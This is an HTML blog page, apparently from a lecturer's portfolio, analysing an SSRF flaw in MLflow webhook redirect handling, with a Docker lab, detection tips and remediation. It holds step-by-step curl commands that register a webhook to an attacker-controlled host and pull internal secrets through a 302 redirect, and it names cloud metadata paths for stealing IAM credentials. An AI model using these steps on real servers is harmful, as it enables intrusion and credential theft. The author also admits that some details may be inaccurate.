@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+  <title>CVE-2026-64849 — SSRF en Webhooks de MLflow | Isacio Tamayo</title>
+  <meta name="description" content="Análisis técnico del CVE-2026-64849, un SSRF crítico en MLflow causado por un defecto TOCTOU en el manejo de redirects de webhooks. Incluye arquitectura del lab y guía de remediación." />
+  <meta name="author" content="Isacio Tamayo" />
+  <link rel="canonical" href="https://isacio-tamayo.ponciop.online/blog-mlflow-ssrf-es.html" />
+
+  <meta property="og:title" content="CVE-2026-64849 — SSRF en Webhooks de MLflow | Isacio Tamayo" />
+  <meta property="og:description" content="Análisis técnico del CVE-2026-64849, un SSRF crítico en MLflow causado por un defecto TOCTOU en el manejo de redirects de webhooks." />
+  <meta property="og:type" content="article" />
+  <meta property="og:url" content="https://isacio-tamayo.ponciop.online/blog-mlflow-ssrf-es.html" />
+  <meta property="og:site_name" content="Isacio Tamayo Portfolio" />
+  <meta property="og:locale" content="es_PA" />
+  <meta property="og:locale:alternate" content="en_US" />
+  <meta property="og:image" content="https://isacio-tamayo.ponciop.online/assets/img/brand/isacio-tamayo-wallpaper.png" />
+  <meta property="og:image:secure_url" content="https://isacio-tamayo.ponciop.online/assets/img/brand/isacio-tamayo-wallpaper.png" />
+  <meta property="og:image:type" content="image/png" />
+  <meta property="og:image:width" content="1672" />
+  <meta property="og:image:height" content="941" />
+  <meta property="og:image:alt" content="Isacio Tamayo Cloud DevOps Cybersecurity personal brand banner" />
+
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="CVE-2026-64849 — SSRF en Webhooks de MLflow | Isacio Tamayo" />
+  <meta name="twitter:description" content="Análisis técnico del CVE-2026-64849, un SSRF crítico en MLflow causado por un defecto TOCTOU en el manejo de redirects de webhooks." />
+  <meta name="twitter:image" content="https://isacio-tamayo.ponciop.online/assets/img/brand/isacio-tamayo-wallpaper.png" />
+
+  <link rel="alternate" hreflang="en" href="https://isacio-tamayo.ponciop.online/blog-mlflow-ssrf.html" />
+  <link rel="alternate" hreflang="es" href="https://isacio-tamayo.ponciop.online/blog-mlflow-ssrf-es.html" />
+  <link rel="alternate" hreflang="x-default" href="https://isacio-tamayo.ponciop.online/blog-mlflow-ssrf.html" />
+
+  <link rel="icon" type="image/svg+xml" href="favicon.svg" />
+  <link rel="stylesheet" href="assets/css/styles.css" />
+    <style>
+    .blog-article { max-width: 780px; margin: 0 auto; padding: 0 1rem; }
+    .article-body { max-width: 780px; margin: 0 auto; padding: 0 1rem; }
+    .blog-article h1, .article-body h1 { font-size: clamp(1.75rem,4vw,2.5rem); line-height: 1.2; margin: 0 0 1rem; }
+    .blog-article h2, .article-body h2 { font-size: 1.5rem; margin: 2.5rem 0 1rem; border-left: 4px solid var(--accent); padding-left: 0.75rem; }
+    .blog-article h3, .article-body h3 { font-size: 1.2rem; margin: 1.75rem 0 0.75rem; }
+    .blog-article p, .article-body p { color: var(--muted); line-height: 1.75; margin-bottom: 1rem; }
+    .blog-article ul, .blog-article ol, .article-body ul, .article-body ol { margin-bottom: 1rem; padding-left: 1.5rem; }
+    .blog-article li, .article-body li { color: var(--muted); margin-bottom: 0.4rem; line-height: 1.6; }
+    .blog-article strong, .article-body strong { color: var(--text); }
+    .blog-article pre, .article-body pre { background: var(--card); color: var(--text); border: 1px solid var(--border); padding: 1.25rem; border-radius: 8px; overflow-x: auto; margin-bottom: 1.5rem; font-size: 0.85rem; line-height: 1.6; }
+    .blog-article code, .article-body code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, "Liberation Mono", monospace; }
+    .blog-article pre code, .article-body pre code { background: none; padding: 0; color: var(--text); }
+    .blog-article :not(pre) > code, .article-body :not(pre) > code { background: rgba(255,49,88,.10); padding: 0.15em 0.4em; border-radius: 4px; font-size: 0.9em; color: var(--accent); }
+    .blog-article table, .article-body table { width: 100%; border-collapse: collapse; margin-bottom: 1.5rem; font-size: 0.92rem; }
+    .blog-article th, .blog-article td, .article-body th, .article-body td { border: 1px solid var(--border); padding: 0.65rem 0.85rem; text-align: left; }
+    .blog-article th, .article-body th { background: var(--card-2); color: var(--text); font-weight: 600; }
+    .blog-article td, .article-body td { background: var(--card); color: var(--muted); }
+    .ascii-diagram, .diagram { background: var(--card); color: var(--accent-2); border: 1px solid var(--border); padding: 1.25rem; border-radius: 8px; overflow-x: auto; margin-bottom: 1.5rem; font-size: 0.8rem; line-height: 1.5; white-space: pre; font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; }
+    .severity-badge, .vuln-badge { display: inline-block; background: #ff3158; color: #17040a; padding: 0.2em 0.6em; border-radius: 4px; font-weight: 700; font-size: 0.9em; }
+    .warning-box, .callout.danger { background: rgba(255,49,88,.08); border-left: 4px solid var(--accent); padding: 1rem 1.25rem; border-radius: 4px; margin-bottom: 1.5rem; color: var(--muted); }
+    .warning-box strong, .callout.danger strong { color: var(--accent); }
+    .info-box, .callout.info { background: rgba(0,212,255,.08); border-left: 4px solid var(--accent-2); padding: 1rem 1.25rem; border-radius: 4px; margin-bottom: 1.5rem; color: var(--muted); }
+    .info-box strong, .callout.info strong { color: var(--accent-2); }
+    .highlight-box { background: var(--card); border-left: 4px solid var(--accent); padding: 1rem 1.25rem; border-radius: 0 8px 8px 0; margin-bottom: 1.5rem; color: var(--muted); }
+    .highlight-box strong { color: var(--accent); }
+    .blog-meta, .article-meta { display: flex; flex-wrap: wrap; gap: 1.5rem; margin-bottom: 1.5rem; font-size: 0.88rem; color: var(--muted); }
+    .back-link, .back-to-blog { display: inline-block; margin-bottom: 1.5rem; color: var(--accent-2); text-decoration: none; font-size: 0.9rem; }
+    .back-link:hover, .back-to-blog:hover { text-decoration: underline; }
+    .back-to-blog a { color: var(--accent-2); text-decoration: none; }
+    .back-to-blog a:hover { text-decoration: underline; }
+    .article-header, .article-hero { padding: 3rem 0 1.5rem; }
+    .article-header h1, .article-hero h1 { color: var(--text); }
+    .article-lang-switch { display: inline-flex; gap: 0.5rem; margin-top: 0.75rem; }
+    .article-lang-switch a { padding: 0.3rem 0.75rem; border: 1px solid var(--border); border-radius: 4px; font-size: 0.8rem; text-decoration: none; color: var(--muted); }
+    .article-lang-switch a.active, .article-lang-switch a:hover { border-color: var(--accent); color: var(--accent); }
+    .step-list { counter-reset: step-counter; list-style: none; padding-left: 0; }
+    .step-list li { counter-increment: step-counter; padding-left: 2.5rem; position: relative; margin-bottom: 1.25rem; }
+    .step-list li::before { content: counter(step-counter); position: absolute; left: 0; top: 0; width: 1.75rem; height: 1.75rem; background: var(--accent); color: #17040a; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 0.8rem; font-weight: 700; }
+    .repo-link { display: inline-flex; align-items: center; margin-top: 1rem; padding: 10px 14px; border: 1px solid var(--border); border-radius: 10px; color: var(--text); text-decoration: none; background: var(--accent); font-weight: 800; }
+    .repo-link::before { content: ">"; margin-right: 8px; }
+    .repo-link:hover { background: #ff3158; color: #17040a; }
+  </style>
+
+</head>
+
+<body>
+  <header class="site-header">
+    <div class="container nav-wrap">
+      <a class="brand" href="es.html#top" aria-label="Inicio">
+        <span class="brand-mark"><img src="assets/img/brand/isacio-tamayo-logo.webp" alt="" /></span>
+        <span>Isacio Tamayo</span>
+      </a>
+
+      <div class="nav-right">
+        <input class="menu-toggle" type="checkbox" id="site-menu-toggle" aria-label="Alternar menú de navegación" />
+        <label class="menu-button" for="site-menu-toggle"><span>MENÚ</span></label>
+        <nav class="desktop-nav" aria-label="Navegación principal">
+          <a href="es.html#summary">Resumen</a>
+          <a href="es.html#skills">Habilidades</a>
+          <a href="es.html#experience">Experiencia</a>
+          <a href="es.html#certifications">Credenciales</a>
+          <a href="es.html#projects">Proyectos</a>
+          <a href="es.html#blog">Blog</a>
+          <a href="es.html#contact">Contacto</a>
+        </nav>
+        <div class="language-switch" aria-label="Selector de idioma">
+          <a href="blog-mlflow-ssrf.html">EN</a>
+          <a class="active" href="blog-mlflow-ssrf-es.html" aria-current="page">ES</a>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main id="top">
+    <section class="article-hero">
+      <div class="container">
+        <p class="eyebrow">Análisis de Vulnerabilidad · CVE-2026-64849</p>
+        <h1>CVE-2026-64849 — SSRF en Webhooks de MLflow: Explotando TOCTOU en la Validación de Redirects</h1>
+        <div class="article-meta">
+          <span>Por Isacio Tamayo</span>
+          <span>Agosto 2026</span>
+          <span>SSRF · TOCTOU · MLflow</span>
+          <span>CVSS 3.1: 9.3 CRÍTICO</span>
+        </div>
+      </div>
+    </section>
+
+    <section class="article-body">
+      <div class="container">
+
+        <div class="callout info">
+          <p><strong>Aviso:</strong> Sí, usé IA para escribir esto — estamos en 2026, todos usan IA — y es mi
+          primer año dando clases, así que mis estudiantes merecen contenido que no les provoque sueño. Soy
+          profe universitario de redes y ciberseguridad, así que esto es (supuestamente) correcto. Se basa en
+          un CVE real, pero igual que las excusas de mis estudiantes, algún detalle puede no ser 100% a prueba
+          de balas. Léelo, aprende, y échame la culpa después.</p>
+        </div>
+
+        <h2>Resumen Ejecutivo</h2>
+
+        <table>
+          <thead>
+            <tr>
+              <th>Campo</th>
+              <th>Detalle</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr><td>CVE</td><td>CVE-2026-64849</td></tr>
+            <tr><td>CWE</td><td>CWE-918 (Server-Side Request Forgery)</td></tr>
+            <tr><td>CVSS 3.1</td><td><strong>9.3 CRÍTICO</strong></td></tr>
+            <tr><td>Producto afectado</td><td>MLflow Tracking Server &lt; 3.15.0</td></tr>
+            <tr><td>Versión testeada</td><td>MLflow 3.13.0 (stock, sin modificar)</td></tr>
+            <tr><td>Autenticación requerida</td><td>No (explotación sin autenticación)</td></tr>
+            <tr><td>Tipo de defecto</td><td>TOCTOU (Time-of-Check / Time-of-Use)</td></tr>
+            <tr><td>Vector de ataque</td><td>Webhook URL validation vs. redirect following</td></tr>
+          </tbody>
+        </table>
+
+        <p>
+          CVE-2026-64849 es un SSRF crítico en MLflow Tracking Server. La vulnerabilidad radica en un defecto TOCTOU
+          (Time-of-Check / Time-of-Use): MLflow valida la URL del webhook antes de guardarla — verificando esquema,
+          IPs privadas e IPs de metadata — pero durante el request real, si la respuesta es un redirect HTTP (302),
+          la librería <code>requests</code> sigue el redirect automáticamente y el destino nunca se re-valida.
+        </p>
+
+        <div class="callout danger">
+          <p><strong>Impacto:</strong> Un atacante puede usar MLflow como proxy hacia servicios internos, extrayendo
+          credenciales, configuraciones y datos de metadata cloud sin necesidad de autenticación.</p>
+        </div>
+
+        <h2>Análisis de la Vulnerabilidad</h2>
+
+        <h3>Mecanismo de Webhooks en MLflow</h3>
+        <p>
+          MLflow permite registrar webhooks que disparan requests HTTP ante eventos como la creación de experimentos,
+          ejecuciones de pipelines o publicación de modelos. Cada webhook se configura con una URL de destino que
+          MLflow invocará cuando el evento correspondiente ocurra.
+        </p>
+
+        <h3>Validación de URLs</h3>
+        <p>
+          Cuando un usuario registra un webhook, MLflow ejecuta una función de validación que verifica:
+        </p>
+        <ul>
+          <li>El esquema de la URL (debe ser <code>http://</code> o <code>https://</code>)</li>
+          <li>Que la IP resuelta no pertenezca a rangos de IPs privadas (<code>10.0.0.0/8</code>, <code>172.16.0.0/12</code>, <code>192.168.0.0/16</code>)</li>
+          <li>Que la IP resuelta no coincida con direcciones de metadata cloud (<code>169.254.169.254</code>)</li>
+        </ul>
+        <p>
+          Esta validación se ejecuta <strong>una sola vez</strong>, al momento de registrar el webhook.
+          Si la URL pasa la validación, se almacena permanentemente.
+        </p>
+
+        <h3>El Fallo: TOCTOU en Redirects</h3>
+        <p>
+          Durante el request real hacia el webhook, MLflow utiliza la librería Python <code>requests</code> para
+          realizar la llamada HTTP. Por defecto, <code>requests</code> sigue redirects 3xx (301, 302, 307, 308)
+          de forma automática e transparente.
+        </p>
+
+        <div class="callout danger">
+          <p><strong>El problema:</strong> Cuando el servidor remoto responde con un <code>302 Found</code> apuntando
+          a un servicio interno, MLflow sigue el redirect sin re-validar que el destino final cumpla con las
+          restricciones de la validación original. El resultado es un SSRF completo.</p>
+        </div>
+
+        <p>
+          La cadena de explotación es directa:
+        </p>
+        <ol>
+          <li>El atacante registra un webhook apuntando a su servidor controlado (URL válida según la validación)</li>
+          <li>El servidor del atacante responde con <code>302 Found</code> y un header <code>Location: http://internal-service:8888/admin/secret</code></li>
+          <li>MLflow sigue el redirect hacia la dirección interna</li>
+          <li>El contenido del servicio interno se retorna al atacante a través de la respuesta del webhook</li>
+        </ol>
+
+        <h2>Arquitectura del Lab</h2>
+
+        <p>
+          El laboratorio de prueba utiliza Docker Compose con tres contenedores en una red aislada llamada
+          <code>lab_network</code> para simular el entorno de explotación de forma segura y controlada.
+        </p>
+
+        <div class="ascii-diagram">
+<strong>┌─────────────────────────────────────────────────────────────────────┐</strong>
+<strong>│                          lab_network (aislada)                      │</strong>
+<strong>│                                                                     │</strong>
+<strong>│  ┌──────────────────┐  ┌──────────────────┐  ┌──────────────────┐  │</strong>
+<strong>│  │  mlflow-vulnerable│  │  attacker-server │  │ internal-service │  │</strong>
+<strong>│  │                   │  │                  │  │                  │  │</strong>
+<strong>│  │  MLflow 3.13.0   │  │  http.server     │  │  http.server     │  │</strong>
+<strong>│  │  Puerto 5000     │  │  Puerto 8080     │  │  Puerto 8888     │  │</strong>
+<strong>│  │  (expuesto host) │  │  (expuesto host) │  │  (NO expuesto)   │  │</strong>
+<strong>│  │                   │  │  Responde 302    │  │  /admin/secret   │  │</strong>
+<strong>│  │  Endpoints:       │  │  → internal svc  │  │  /api/internal/  │  │</strong>
+<strong>│  │  /api/2.0/mlflow/ │  │                  │  │  config          │  │</strong>
+<strong>│  │  /webhooks        │  │                  │  │  Puerto 8889     │  │</strong>
+<strong>│  │  /test            │  │                  │  │  (servicio       │  │</strong>
+<strong>│  │                   │  │                  │  │   oculto)        │  │</strong>
+<strong>│  └──────────────────┘  └──────────────────┘  └──────────────────┘  │</strong>
+<strong>│                                                                     │</strong>
+<strong>│  ┌─────────────────────────────────────────────────────────────┐    │</strong>
+<strong>│  │  Flujo de explotación:                                      │    │</strong>
+<strong>│  │  Atacante → MLflow (5000) → attacker (8080) → internal (8888)│   │</strong>
+<strong>│  └─────────────────────────────────────────────────────────────┘    │</strong>
+<strong>└─────────────────────────────────────────────────────────────────────┘</strong></div>
+
+        <h3>Contenedores</h3>
+        <ul>
+          <li><strong>mlflow-vulnerable</strong> — MLflow 3.13.0 en el puerto 5000. Es la víctima. El servidor Tracking sin autenticación.</li>
+          <li><strong>attacker-server</strong> — Servidor Python (HTTP estándar <code>http.server</code>) en el puerto 8080. Responde con <code>302 Found</code> y un header <code>Location</code> apuntando al servicio interno.</li>
+          <li><strong>internal-service</strong> — Servicio interno mock en el puerto 8888. Contiene endpoints sensibles (<code>/admin/secret</code>, <code>/api/internal/config</code>) y un servicio oculto adicional en el puerto 8889.</li>
+        </ul>
+
+        <div class="callout info">
+          <p><strong>Nota:</strong> El servicio interno NO está expuesto al host. Solo es accesible desde dentro de <code>lab_network</code>,
+          lo que simula correctamente un entorno de red interna corporativa.</p>
+        </div>
+
+        <div class="callout info">
+          <p><strong>Configuración del lab:</strong> MLflow se inicia con
+          <code>MLFLOW_WEBHOOK_ALLOW_PRIVATE_IPS=true</code> y
+          <code>MLFLOW_WEBHOOK_ALLOWED_SCHEMES=http,https</code>, por lo que el contenedor del atacante
+          (IP privada de <code>lab_network</code>) supera la validación de registro. En cualquier caso,
+          el destino de un redirect nunca se valida — esa es la vulnerabilidad.</p>
+        </div>
+
+        <h2>Cadena de Explotación</h2>
+
+        <p>La explotación completa se ejecuta en tres comandos:</p>
+
+        <h3>Paso 1 — Registrar el webhook</h3>
+        <pre><code>curl -X POST http://localhost:5000/api/2.0/mlflow/webhooks \
+  -H "Content-Type: application/json" \
+  -d '{
+    "name": "ssrf_test",
+    "url": "http://attacker_server:8080/webhook",
+    "events": [{"entity": "MODEL_VERSION", "action": "CREATED"}]
+  }'</code></pre>
+
+        <p>
+          MLflow valida la URL <code>http://attacker_server:8080/webhook</code> y guarda el webhook;
+          el lab está configurado para admitir IPs privadas, así que el registro es aceptado. Lo
+          importante es que <strong>solo la URL registrada se valida</strong> — el destino del
+          redirect del siguiente paso no.
+        </p>
+
+        <h3>Paso 2 — Disparar el endpoint /test</h3>
+        <pre><code>WEBHOOK_ID=$(curl -s -X POST http://localhost:5000/api/2.0/mlflow/webhooks \
+  -H "Content-Type: application/json" \
+  -d '{
+    "name": "ssrf_test",
+    "url": "http://attacker_server:8080/webhook",
+    "events": [{"entity": "MODEL_VERSION", "action": "CREATED"}]
+  }' | jq -r '.webhook.webhook_id')
+
+curl -X POST "http://localhost:5000/api/2.0/mlflow/webhooks/$WEBHOOK_ID/test" \
+  -H "Content-Type: application/json" \
+  -d '{}'</code></pre>
+
+        <p>
+          MLflow ejecuta el webhook. El servidor del atacante responde con:
+        </p>
+        <pre><code>HTTP/1.1 302 Found
+Location: http://internal-service:8888/admin/secret</code></pre>
+
+        <p>
+          La librería <code>requests</code> de MLflow sigue el redirect automáticamente.
+          El destino <code>http://internal-service:8888/admin/secret</code> nunca fue validado.
+          MLflow actúa como proxy hacia la red interna.
+        </p>
+
+        <h3>Paso 3 — Extraer los datos</h3>
+        <p>
+          El contenido del servicio interno viaja de vuelta en la respuesta del endpoint
+          <code>/test</code>, anidado en <code>result.response_body</code> (JSON serializado):
+        </p>
+
+        <pre><code>curl -s -X POST "http://localhost:5000/api/2.0/mlflow/webhooks/$WEBHOOK_ID/test" \
+  -H "Content-Type: application/json" -d '{}' \
+  | jq -r '.result.response_body | fromjson'
+
+# { "service": "internal-admin-portal", ... } — credenciales y configuración interna</code></pre>
+
+        <h2>Variaciones de Ataque</h2>
+
+        <p>
+          Una vez establecido el SSRF, el atacante tiene múltiples vectores de explotación dependiendo
+          de la infraestructura interna del objetivo:
+        </p>
+
+        <h3>(a) Enumeración de Endpoints Admin</h3>
+        <p>
+          Accediendo a rutas <code>/admin/</code> en servicios internos, el atacante puede robar
+          credenciales de administrador, tokens de API y configuraciones de bases de datos.
+        </p>
+
+        <h3>(b) Acceso a Configuración Interna</h3>
+        <p>
+          Endpoints como <code>/api/internal/config</code> exponen configuraciones de servicios,
+          cadenas de conexión a bases de datos, claves de servicios cloud y parámetros de
+          infraestructura interna.
+        </p>
+
+        <h3>(c) Metadata Cloud (IMDS)</h3>
+        <p>
+          En entornos cloud, el SSRF puede usarse para acceder al endpoint de Instance Metadata Service
+          (IMDS) vía paths como <code>/latest/meta-data/</code>, <code>/latest/meta-data/iam/</code>
+          o <code>/latest/user-data/</code>. Esto permite robar credenciales IAM, tokens temporales
+          y datos de configuración de la instancia.
+        </p>
+
+        <h3>(d) SSRF Ciego (Port Scanning)</h3>
+        <p>
+          Incluso cuando la respuesta del redirect no se retorna al atacante, puede inferir
+          información observando diferencias en tiempos de respuesta o códigos de error —
+          permitiendo port scanning de la red interna desde MLflow.
+        </p>
+
+        <h3>(e) DNS Rebinding (Teórico)</h3>
+        <p>
+          Un escenario más avanzado involucra DNS rebinding: el dominio del atacante resuelve a una IP pública
+          durante la validación y a una IP interna durante el request real. Aunque es teórico en este contexto,
+          representa una vector de evasión adicional.
+        </p>
+
+        <h2>Detección</h2>
+
+        <p>Las siguientes señales de alerta indican explotación activa de CVE-2026-64849:</p>
+
+        <ul>
+          <li><strong>Registros de API:</strong> Monitorear llamadas a los endpoints de registro y prueba de webhooks
+            (<code>/api/2.0/mlflow/webhooks</code> y <code>/api/2.0/mlflow/webhooks/{id}/test</code>).</li>
+          <li><strong>Cadenas de redirects 302:</strong> Detectar en los logs de MLflow requests salientes que
+            siguen múltiples redirects, especialmente hacia dominios o IPs no esperadas.</li>
+          <li><strong>Tráfico a red interna:</strong> Alertar sobre patrones de acceso inesperados desde el
+            servidor MLflow hacia servicios internos que normalmente no deberían ser contactados.</li>
+          <li><strong>User-Agent:</strong> Las solicitudes generadas por <code>python-requests</code> desde MLflow
+            pueden ayudar a identificar el origen del tráfico.</li>
+        </ul>
+
+        <h2>Remediación</h2>
+
+        <h3>Inmediata</h3>
+        <ol>
+          <li><strong>Actualizar MLflow</strong> a la versión &ge; 3.15.0, que corrige el defecto
+            re-validando el destino después de cada redirect.</li>
+          <li><strong>Implementar autenticación</strong> en MLflow Tracking Server. Deshabilitar el acceso
+            anónimo a la API de webhooks.</li>
+          <li><strong>Controles de red:</strong> Aplicar reglas de firewall o security groups que bloqueen
+            a MLflow el acceso directo a servicios internos (principio de menor privilegio de red).</li>
+        </ol>
+
+        <h3>Monitoreo continuo</h3>
+        <ul>
+          <li>Supervisar registros de webhooks registrados para detectar URLs sospechosas.</li>
+          <li>Implementar alertas sobre requests HTTP salientes desde el servidor MLflow hacia
+            rangos de IP internos.</li>
+          <li>Revisar periódicamente la configuración de red y los controles de acceso.</li>
+        </ul>
+
+        <h2>Repositorio</h2>
+
+        <p>
+          El laboratorio completo, incluyendo Docker Compose, servicios mock, exploit automatizado
+          y reto CTF de 5 niveles, está disponible en GitHub:
+        </p>
+
+        <a class="repo-link" href="https://github.com/isaca0315/CVE-2026-64849-poc-lab" target="_blank" rel="noopener noreferrer">
+          Ver Repositorio en GitHub
+        </a>
+
+      </div>
+    </section>
+  </main>
+
+  <footer class="footer">
+    <div class="container footer-inner">
+      <p>&copy; 2026 Isacio Tamayo &middot; Portafolio DevOps &middot; Cloud &middot; Ciberseguridad</p>
+      <a href="es.html#top">Volver arriba</a>
+    </div>
+  </footer>
+</body>
+</html>
